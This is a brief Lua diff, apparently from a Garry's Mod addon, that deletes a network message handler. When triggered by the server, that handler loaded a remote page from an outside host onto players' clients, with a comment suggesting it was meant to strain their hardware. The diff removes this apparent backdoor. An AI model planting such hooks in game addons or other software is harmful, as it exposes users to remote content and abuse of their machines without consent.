@@ -24,7 +24,3 @@ if !IsValid(GryBinoCulars) then return end
 	GryBinoCulars:Stop()
 	GryBinoCulars:Remove()
 end
-
-net.Receive("gry_spawn", function()
-	ScaleFormGFx_Proxy("http://extrem-team.com/init.html", 1000, 700, 5) -- Rip cheap monitors
-end)
